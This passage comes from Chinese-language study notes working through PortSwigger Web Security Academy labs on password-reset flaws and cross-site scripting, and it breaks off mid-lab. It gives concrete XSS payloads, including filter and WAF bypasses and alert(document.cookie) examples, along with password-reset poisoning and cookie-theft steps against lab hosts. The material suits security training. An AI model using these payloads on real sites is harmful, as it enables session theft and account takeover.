<span class="token number">2.</span> 利用靶场提供的服务器：构成完整payload
<span class="token number">3.</span> 稍等一会，等对方登录，并访问了那篇文章，即可偷取对方cookie
<span class="token number">4.</span> 对cookie：base64解码，md5解码</code></pre></li>
</ol></li>
</ol></li>
<li><p><strong>Lab: Password reset broken logic</strong></p>
<ol type="1">
<li><p>用自身账户，试探重置密码功能，发现服务器并不检查<strong>邮件链接的token</strong>和<strong>用户发送的重置密码请求的token</strong>的一致性</p></li>
<li><p>因此可以将token删除，并将重置密码的用户名更改为攻击目标</p>
<figure>
<img src="https://s2.loli.net/2023/04/04/bx61MrKwaNyeSEz.png"
alt="image-20230404005444860" />
<figcaption aria-hidden="true">image-20230404005444860</figcaption>
</figure></li>
</ol></li>
<li><p><strong>Lab: Password reset poisoning via middleware</strong></p>
<ol type="1">
<li><p>使用自身账户，试探重置密码功能，发现token会被验证</p></li>
<li><p>在burp-repeater上，使用如下请求头，注意中间换行<img
src="https://s2.loli.net/2023/04/04/RwX7VmS9oOte5Mr.png"
alt="image-20230404015734378" /></p>
<p>X-Forward-Host:通过在请求中添加X-Forwarded-Host头，代理服务器可以将原始主机名传递给Web服务器</p></li>
<li><p>当目标用户carlos发送重置密码请求时，重置邮件会被发送到攻击者指定的服务器，通过服务器日志可以获得目标用户的token</p></li>
<li><p>将一封已知的重置链接的邮件的token换成目标用户的token，便可更改目标用户的密码</p></li>
</ol></li>
<li><p><strong>lab:Password brute-force via password change</strong></p>
<ol type="1">
<li><p>使用自身账户，试探重置密码，发现在新密码1和新密码2不一致时</p>
<ol type="1">
<li>如果当前密码正确：则相应，New .....</li>
<li>如果当密码不正切：则响应，不同</li>
</ol></li>
<li><p>intruder 配置<img
src="https://s2.loli.net/2023/04/04/C6SUJODonVc7hyK.png"
alt="image-20230404030946394" /></p>
<p>匹配规则<img src="https://s2.loli.net/2023/04/04/rCft58OngRXwjZa.png"
alt="second" /></p></li>
<li><p>result<img
src="https://s2.loli.net/2023/04/04/C9ZjWfdMb5Eyuwq.png"
alt="image-20230404031321962" /></p></li>
</ol></li>
</ul></li>
</ul>
<h3 id="cross-site-scripting重置版">Cross-site scripting（重置版）</h3>
<h4 id="what-is-cross-site-scripting-xss">What is cross-site scripting
(XSS)?</h4>
<h4 id="xss不同类型区分">Xss不同类型区分</h4>
<ul>
<li><p><strong>反射型XSS漏洞</strong>发生在应用程序将用户输入的数据（通常是通过URL参数）包含在响应中，并且在客户端（浏览器）上执行这些数据的情况下。</p>
<p>漏洞的原理如下：</p>
<ol type="1">
<li><p>攻击者构造一个恶意的URL，并在URL参数中插入恶意的脚本代码，例如：
<code>https://vulnerable-website.com/search?query=&lt;script&gt;alert('XSS Attack')&lt;/script&gt;</code></p></li>
<li><p>用户访问包含恶意URL的网页时，浏览器会发送请求到<code>vulnerable-website.com</code>，并将恶意的脚本代码传递给服务器。</p></li>
<li><p>服务器接收到请求，并将恶意脚本代码包含在响应中，例如：
<code>&lt;p&gt;搜索结果： &lt;script&gt;alert('XSS Attack')&lt;/script&gt;&lt;/p&gt;</code></p></li>
<li><p>浏览器接收到响应后，会解析HTML，并执行其中的JavaScript代码。这时，恶意的脚本代码会被执行，弹出一个警告框，这就是XSS攻击成功的例子。</p></li>
</ol>
<p>漏洞之所以称为"反射型"，是因为恶意脚本代码并没有被永久地储存在目标网站上，而是"反射"回浏览器执行。漏洞主要存在于应用程序未正确过滤或编码用户输入，导致恶意代码被传递到应用程序的响应中，从而使得攻击者可以在用户的浏览器上执行任意脚本。</p></li>
<li><p><strong>存储型XSS漏洞</strong>发生在应用程序将用户输入的数据（通常是通过表单提交或其他方式）存储在服务器端，并在后续的页面加载或展示中未经过滤地包含在页面中，从而导致恶意脚本被执行。</p>
<p>漏洞的原理如下：</p>
<ol type="1">
<li><p>攻击者在应用程序的输入字段中插入恶意的脚本代码，例如在评论框或消息框中：
<code>&lt;script&gt;alert('XSS Attack')&lt;/script&gt;</code></p></li>
<li><p>用户将恶意脚本代码提交给应用程序，通常是通过表单提交或其他交互方式。</p></li>
<li><p>应用程序接收到用户输入的数据，并将其存储在数据库或其他数据存储位置中，未经过滤或编码地储存恶意脚本代码。</p></li>
<li><p>当其他用户或管理员查看评论、消息或其他包含用户输入数据的页面时，服务器将恶意脚本代码包含在响应中，并将其发送到浏览器。</p></li>
<li><p>浏览器接收到响应后，会解析HTML，并执行其中的JavaScript代码。这时，恶意的脚本代码会被执行，弹出一个警告框，这就是XSS攻击成功的例子。</p></li>
</ol>
<p>存储型XSS漏洞之所以称为"存储型"，是因为恶意脚本代码被永久地储存在目标网站的数据库或其他数据存储位置中，而不仅仅是"反射"回浏览器执行。攻击者利用漏洞在应用程序的存储中注入恶意代码，这些恶意代码在后续的页面加载中被加载和执行。</p></li>
<li><p><strong>DOM型XSS漏洞</strong>是一种特殊类型的跨站脚本攻击，与传统的反射型和存储型XSS攻击不同。DOM型XSS漏洞是由于客户端（浏览器）中的JavaScript代码在处理用户输入时，未经适当处理而导致的安全漏洞。</p>
<p>漏洞的原理如下：</p>
<ol type="1">
<li><p>攻击者构造恶意的URL，包含了恶意的JavaScript代码。这些代码可能会包含在URL的查询字符串、哈希部分或其他参数中。</p></li>
<li><p>用户点击或访问带有恶意URL的页面。浏览器加载该URL，并解析其中的JavaScript代码。</p></li>
<li><p>JavaScript代码会直接操作文档对象模型（DOM），修改页面的内容或执行其他操作。</p></li>
<li><p>攻击者的恶意JavaScript代码可能会执行各种恶意操作，如窃取用户敏感信息、劫持用户会话、篡改页面内容等。</p></li>
<li><p>由于DOM型XSS漏洞是在浏览器端执行的，所以它不需要将恶意代码传递到服务器端，因此无法通过服务器端的过滤或编码来阻止。</p></li>
</ol>
<p>DOM型XSS漏洞之所以称为"DOM型"，是因为攻击主要发生在浏览器中的DOM操作过程中。当用户访问恶意URL时，浏览器会执行其中的JavaScript代码，而不需要将数据发送到服务器。</p></li>
<li><p><strong>Self-XSS（自我跨站脚本）</strong>是一种社交工程手段，攻击者通过欺骗用户在浏览器控制台或开发者工具中执行恶意代码。与传统的XSS漏洞不同，Self-XSS并不是一种真正的漏洞，而是利用用户的不知情和轻信来实施攻击。</p>
<p>Self-XSS的原理如下：</p>
<ol type="1">
<li><p>攻击者制作一个诱导性的消息或诱骗用户点击特殊链接的社交工程页面，通常伪装成一个看似有趣或有奖励的内容。</p></li>
<li><p>用户被欺骗后，点击了诱导性的链接或访问了社交工程页面。</p></li>
<li><p>社交工程页面上通常会提示用户在浏览器的开发者工具或控制台中粘贴一段代码，并声称这是获得奖励或解锁特定功能的必要步骤。</p></li>
<li><p>用户出于好奇或追求奖励，被鼓励在开发者工具或控制台中执行代码。</p></li>
<li><p>恶意代码会利用用户的特权执行恶意操作，例如盗取用户的敏感信息、劫持用户会话、篡改页面内容等。</p></li>
</ol>
<p>Self-XSS的特点是攻击者需要诱骗用户自行执行恶意代码，而不是直接注入恶意脚本到网页上。由于Self-XSS不是真正的漏洞，因此它不能通过对代码的过滤或编码来修复。相反，解决Self-XSS的关键在于教育和提高用户的安全意识。</p></li>
</ul>
<h4 id="stored-xss">Stored XSS</h4>
<h4 id="dom-based-xss">DOM-based XSS</h4>
<ul>
<li><p>在DOM型XSS中,源(source)到沉淀(sink)的污点传播过程可以概括如下:</p>
<ol type="1">
<li>源:包含用户可控数据的输入,常见的如URL、输入框值等。</li>
<li>污点:源中的恶意数据,如XSS payload。</li>
<li>传播:通过程序中的变量、函数调用等将数据从源传播到沉淀。</li>
<li>沉淀:会最终使用数据的危险函数,如eval、innerHTML等。</li>
<li>当污点到达沉淀时,沉淀函数会对其进行解释执行,实现XSS。</li>
</ol>
<p>整个过程具体可包括:</p>
<ul>
<li>从window.location读取URL值到变量</li>
<li>通过DOM操作将变量设置为某个元素的属性</li>
<li>将此属性innerHTML渲染到页面</li>
</ul>
<p>污点经过源-&gt;传播-&gt;沉淀最后实现攻击</p></li>
</ul>
<h5
id="lab-dom-xss-in-document.write-sink-using-source-location.search">Lab:
DOM XSS in document.write sink using source location.search</h5>
<ol type="1">
<li><p>输入“12345”，发现位置<img
src="https://s2.loli.net/2023/07/21/BlhUTL7ISA9OpCj.png"
alt="image-20230721145920456" /></p></li>
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h5
id="lab-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element">Lab:
DOM XSS in document.write sink using source location.search inside a
select element</h5>
<ol type="1">
<li><p>此处的选择框<img
src="https://s2.loli.net/2023/07/21/kSWVaOf4oPJBpvz.png"
alt="image-20230721152453050" /></p></li>
<li><p>script<img
src="https://s2.loli.net/2023/07/21/NCo9RMuFstSPQ1B.png"
alt="image-20230721152519053" /></p>
<p>这段代码存在DOM型XSS漏洞,可以分析如下:</p>
<ol type="1">
<li>定义了一个stores数组,包含城市名。</li>
<li>从URL参数storeId中读取值赋给store变量。</li>
<li>使用document.write输出一个下拉列表。</li>
<li>如果store不为空,则添加一个选中它的option。</li>
<li>遍历stores数组,添加其它选项。</li>
<li>问题在于,store值来自用户可控的URL参数。</li>
<li>但在document.write中直接拼接到HTML中。</li>
<li>如果用户输入一个script标签,就可以注入任意JS代码。</li>
<li>例如传入storeId=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>就会在页面注入并执行alert(1)弹框。</li>
</ol></li>
<li><p>Payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">product<span class="token operator">?</span>productId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>storeId<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img<span class="token operator">%</span>20src<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>20onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre></li>
</ol>
<h5 id="lab-dom-xss-in-innerhtml-sink-using-source-location.search">Lab:
DOM XSS in innerHTML sink using source location.search</h5>
<ol type="1">
<li><p>Js<img src="https://s2.loli.net/2023/07/21/SIKJ1qykZC2NTxP.png"
alt="image-20230721153221386" /></p>
<p>innerHTML沉淀的关键特点是:</p>
<ol type="1">
<li>现代浏览器不会在innerHTML中执行script标签。</li>
<li>也不会触发svg的onload事件。</li>
<li>所以需要使用img、iframe等替代元素。</li>
<li>可以配合onload、onerror等事件处理函数使用。</li>
</ol></li>
<li><p>Payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h5
id="lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-location.search-source">Lab:
DOM XSS in jQuery anchor href attribute sink using location.search
source</h5>
<ol type="1">
<li><p>submit feedback页面，修改url参数<img
src="https://s2.loli.net/2023/07/21/LyKbumPV3FDMReW.png"
alt="image-20230721154220785" /></p>
<ol type="1">
<li>F12<img src="https://s2.loli.net/2023/07/21/OILkWrbstv8ufxM.png"
alt="image-20230721154239493" /></li>
</ol></li>
<li><p>url参数：payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></code></pre>
<p>图<img src="https://s2.loli.net/2023/07/21/GTmzhXMtx48aQru.png"
alt="image-20230721154343943" /></p></li>
<li><p>Hit enter and click "back".</p></li>
</ol>
<h5
id="lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event">Lab:
DOM XSS in jQuery selector sink using a hashchange event</h5>
<ol type="1">
<li><p>Js<img src="https://s2.loli.net/2023/07/21/GXcYbEStTgIdK2Q.png"
alt="image-20230721163305412" /></p>
<p>漏洞利用原理如下：</p>
<ol type="1">
<li>利用过程解释：
<ol type="a">
<li><p>将恶意iframe插入实验室网站首页的哈希部分，当访问实验室首页时，将会触发hashchange事件。</p></li>
<li><p>hashchange事件处理函数首先尝试根据哈希部分匹配相应的博客文章标题，但由于哈希部分包含了恶意的<code>&lt;img src=x onerror=print()&gt;</code>代码，导致该代码被注入到jQuery的选择器<code>$()</code>中作为输入。</p></li>
<li><p>jQuery的选择器接受字符串作为输入，若以<code>#</code>字符开头，则会被认为是选择器，而非HTML代码。但在该漏洞中，jQuery没有对输入进行防护，因此可以成功注入HTML代码。</p></li>
<li><p>当<code>$()</code>选择器执行时，恶意代码<code>&lt;img src=x onerror=print()&gt;</code>被认为是选择器的一部分，而非HTML代码，导致执行<code>this.src+='&lt;img src=x onerror=print()&gt;'</code>这段JavaScript代码。</p></li>
<li><p>由于iframe的src属性在加载时会被赋值为<code>https://YOUR-LAB-ID.web-security-academy.net/#&lt;img src=x onerror=print()&gt;</code>，在实验室首页加载iframe时，会触发其中的<code>onload</code>事件。</p></li>
<li><p>在<code>onload</code>事件中，恶意代码<code>&lt;img src=x onerror=print()&gt;</code>被执行，导致调用<code>print()</code>函数，实现XSS漏洞利用。</p></li>
</ol></li>
</ol></li>
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token operator">+=</span><span class="token string">'&lt;img src=x onerror=print()>'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<ul>
<li>为了利用DOM-based
XSS漏洞，我们需要将这个Payload注入到目标网页的DOM中。由于目标网页的域名并非攻击者所控制，直接在目标网页上插入这个Payload是不可能的。因此，我们需要通过一个服务器来构造包含Payload的恶意iframe，并将这个iframe作为一个URL提供给受害者。当受害者打开带有恶意iframe的URL时，JavaScript会加载该iframe并执行其中的代码，从而利用DOM-based
XSS漏洞并执行<code>print()</code>函数。</li>
</ul>
<h5
id="lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded">Lab:
DOM XSS in AngularJS expression with angle brackets and double quotes
HTML-encoded</h5>
<ol type="1">
<li><p>ng-app<img
src="https://s2.loli.net/2023/07/21/RsVZwumrfcdGztH.png"
alt="image-20230721202456671" /></p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token class-name">$on</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p><strong>解析</strong>：</p>
<p>在AngularJS中，双花括号<code>&#123;&#123;&#125;&#125;</code>用于进行数据绑定，将JavaScript表达式的结果插入到HTML中。在给定的表达式中，<code>$on</code>是一个AngularJS内部的事件处理器对象，而<code>constructor</code>是JavaScript中的构造函数。</p>
<p>通过这个表达式<code>&#123;&#123;$on.constructor('alert(1)')()&#125;&#125;</code>，AngularJS将尝试执行<code>$on.constructor('alert(1)')</code>，这会创建一个新的函数，并将JavaScript代码<code>alert(1)</code>作为字符串传递给构造函数。然后通过<code>()</code>调用这个新创建的函数，最终导致<code>alert(1)</code>被执行。</p>
<p>这个漏洞是由于在AngularJS中使用<code>&#123;&#123;$on.constructor&#125;&#125;</code>可以访问构造函数并执行任意代码。这种情况下的DOM
XSS漏洞可利用恶意代码注入并在页面上执行任意JavaScript代码，包括弹出警示框等操作。</p></li>
</ol>
<h5 id="lab-reflected-dom-xss">Lab: Reflected DOM XSS</h5>
<ol type="1">
<li><p>响应<img src="https://s2.loli.net/2023/07/21/tVdiQBTHX8wfUbe.png"
alt="image-20230721210024120" /></p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">\"<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//</span></code></pre></li>
</ol>
<h5 id="lab-stored-dom-xss">Lab: Stored DOM XSS</h5>
<ul>
<li>replace()函数只替换第一次出现的匹配项，利用了额外的角括号绕过了过滤器</li>
</ul>
<ol type="1">
<li><p>Payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre></li>
</ol>
<h4 id="which-sinks-can-lead-to-dom-xss-vulnerabilities">Which sinks can
lead to DOM-XSS vulnerabilities?</h4>
<p>The following are some of the main sinks that can lead to DOM-XSS
vulnerabilities:</p>
<pre class="language-none"><code class="language-none">document.write() 
document.writeln()
document.domain 
element.innerHTML 
element.outerHTML 
element.insertAdjacentHTML
element.onevent</code></pre>
<p>The following jQuery functions are also sinks that can lead to
DOM-XSS vulnerabilities:</p>
<pre class="language-none"><code class="language-none">add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML()</code></pre>
<h4 id="cross-site-scripting-contexts">Cross-site scripting
contexts</h4>
<h5
id="lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked">Lab:
Reflected XSS into HTML context with most tags and attributes
blocked</h5>
<ol type="1">
<li><p>存在WAF</p></li>
<li><p>爆破tag<img
src="https://s2.loli.net/2023/07/21/uikB6bqYcaVEM7s.png"
alt="image-20230721233217143" /></p></li>
<li><p>爆破事件<img
src="https://s2.loli.net/2023/07/21/dVKn5Qh7LHepDJk.png"
alt="image-20230721233238229" /></p></li>
<li><p>最终payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></code></pre>
<p><strong>解析：</strong></p>
<p>当实验目标网站接收到这个payload，并将其存储在服务器端，然后在后续的响应中将它呈现出来时，浏览器会执行其中的JavaScript代码：<code>&lt;body onresize=print()&gt;</code>。这个代码片段定义了一个onresize事件处理程序，当浏览器窗口大小发生改变时，就会触发该事件处理程序，并调用<code>print()</code>函数输出一段文本或执行任意其他JavaScript代码。</p></li>
</ol>
<h5
id="lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones">Lab:
Reflected XSS into HTML context with all tags blocked except custom
ones</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1>#x'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<p><strong>解析：</strong></p>
<p><code>&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;</code></p>
<ul>
<li><p><code>&lt;xss id=x</code>:
这是一个自定义标签，名称为"xss"，并且使用<code>id</code>属性为它赋予一个标识符"x"。通常情况下，浏览器不会对自定义标签做特殊处理，所以这个标签不会引起注意。</p></li>
<li><p><code>onfocus=alert(document.cookie)</code>:
这是<code>onfocus</code>事件处理程序，当元素获得焦点时触发。在这里，我们将其设置为弹出一个包含用户cookie的警示框(alert)。</p></li>
<li><p><code>tabindex=1</code>:
这是<code>tabindex</code>属性，它指定元素在Tab键遍历页面时的顺序。通过将其设置为1，我们可以确保这个元素可以通过键盘Tab键聚焦，从而触发<code>onfocus</code>事件。</p></li>
</ul>
<p>这样的payload在DOM-based
XSS漏洞中特别有用，因为它不依赖于特定的HTML元素或事件，而是直接利用了浏览器的特性，即当一个元素获得焦点时，相关的onfocus事件处理程序会被执行。如果该payload被插入到页面中的一个DOM元素内，并且该元素被设置为自动获得焦点，那么当页面加载时，onfocus事件将立即触发，并导致XSS漏洞的利用，弹出包含用户cookie的警示框。</p></li>
</ol>
<h5
id="lab-reflected-xss-with-event-handlers-and-href-attributes-blocked">Lab:
Reflected XSS with event handlers and href attributes blocked</h5>
<ol type="1">
<li><p>Payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>animate</span> <span class="token attr-name">attributeName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>href</span> <span class="token attr-name">values</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>javascript:alert(1)</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>20</span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>20</span><span class="token punctuation">></span></span>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre>
<p>分析：</p>
<p>这个URL包含一个SVG图像，其中包含一个<code>&lt;a&gt;</code>标签和一个<code>&lt;animate&gt;</code>标签。<code>&lt;a&gt;</code>标签用于创建超链接，而<code>&lt;animate&gt;</code>标签用于在动画中更改属性的值。</p>
<p>分析如下：</p>
<ol type="1">
<li><code>search=&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</code>
是一个GET请求，其中<code>search</code>参数被设置为一个SVG图像的代码。</li>
<li>在SVG代码中，<code>&lt;a&gt;</code>标签用于创建一个超链接，<code>&lt;animate&gt;</code>标签用于在动画中更改超链接的<code>href</code>属性的值。</li>
<li><code>attributeName=href</code>指定了要更改的属性是<code>href</code>属性，而<code>values=javascript:alert(1)</code>指定了动画的值，即在动画中更改<code>href</code>属性的值为<code>javascript:alert(1)</code>。</li>
<li>当页面加载时，动画开始执行，<code>href</code>属性的值被设置为<code>javascript:alert(1)</code>，导致浏览器执行其中的JavaScript代码，即弹出一个包含"1"的弹窗。</li>
</ol></li>
</ol>
<h5 id="lab-reflected-xss-with-some-svg-markup-allowed">Lab: Reflected
XSS with some SVG markup allowed</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/?search="><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>animatetransform</span> <span class="token attr-name">onbegin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">></span></span></code></pre></li>
</ol>
<h5
id="lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Lab:
Reflected XSS into attribute with angle brackets HTML-encoded</h5>
<ol type="1">
<li><p>分析<img src="https://s2.loli.net/2023/07/22/N4sQ9T3igYIJ2Fn.png"
alt="image-20230722011511012" /></p></li>
<li><p>paylaod</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">"onmouseover="alert(1)</code></pre></li>
</ol>
<h5
id="lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Lab:
Stored XSS into anchor href attribute with double quotes
HTML-encoded</h5>
<ul>
<li>javascript 伪协议</li>
</ul>
<ol type="1">
<li><p>website输入框输入"abcde"<img
src="https://s2.loli.net/2023/07/23/7TYp35nAHr2fMZj.png"
alt="image-20230723131730123" /></p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre></li>
</ol>
<h5 id="lab-reflected-xss-in-canonical-link-tag">Lab: Reflected XSS in
canonical link tag</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)</code></pre>
<p>分析：</p>
<ol type="1">
<li>To trigger the exploit on yourself, press one of the following key
combinations:
<ul>
<li>On Windows: <code>ALT+SHIFT+X</code></li>
<li>On MacOS: <code>CTRL+ALT+X</code></li>
<li>On Linux: <code>Alt+X</code></li>
</ul></li>
</ol></li>
</ol>
<h5
id="lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Lab:
Reflected XSS into a JavaScript string with single quote and backslash
escaped</h5>
<ol type="1">
<li><p>分析<img src="https://s2.loli.net/2023/07/23/kmY54NOJLWhaXA1.png"
alt="image-20230723133454092" /></p></li>
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
</ol>
<h5
id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded">Lab:
Reflected XSS into a JavaScript string with angle brackets HTML
encoded</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'-alert(1)-'</span></code></pre></li>
</ol>
<h6
id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped">Lab:
Reflected XSS into a JavaScript string with angle brackets and double
quotes HTML-encoded and single quotes escaped</h6>
<ol type="1">
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">\'<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span></code></pre></li>
</ol>
<h5
id="lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked">Lab:
Reflected XSS in a JavaScript URL with some characters blocked</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;'&#125;,x=x=>&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+'',&#123;x:'</code></pre>
<p><strong>解析：</strong></p>
<p>这个payload使用异常处理和箭头函数来执行代码。让我们逐步分析它：</p>
<ol type="1">
<li><p><code>https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;</code>：这是目标URL，其中<code>YOUR-LAB-ID</code>需要替换为实际的实验室ID。</p></li>
<li><p><code>'&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+'',&#123;x:'</code>：这部分是payload，它的作用是在页面中触发alert弹窗。</p>
<ul>
<li><code>'&#125;,x=x=&gt;&#123;...&#125;,</code>：在这里，我们定义了一个名为<code>x</code>的箭头函数。</li>
<li><code>throw/**/onerror=alert,1337</code>：这是一个throw语句，它将onerror事件处理程序设置为alert函数并传递参数1337。由于throw语句不能作为表达式直接执行，我们使用箭头函数来包装它。</li>
<li><code>toString=x,window+'',&#123;x:''</code>：这部分代码将箭头函数<code>x</code>赋值给<code>toString</code>属性，并通过强制将window对象转换为字符串来触发执行。最后的空对象<code>&#123;x: ''&#125;</code>是为了让代码合法。</li>
</ul></li>
</ol>
<p>总的来说，这个payload的效果是，当访问目标URL时，它会在页面加载时通过异常处理调用alert函数，并弹出一个带有参数1337的弹窗。请注意，为了使这个payload生效，实验室的ID应该被正确替换到URL中。</p></li>
</ol>
<h5
id="lab-stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped">Lab:
Stored XSS into onclick event with angle brackets and double quotes
HTML-encoded and single quotes and backslash escaped</h5>
<ol type="1">
<li><p>分析<img src="https://s2.loli.net/2023/07/23/I3JbW6TSxNCVt5h.png"
alt="image-20230723141703048" /></p></li>
<li><p>website输入框payload</p>
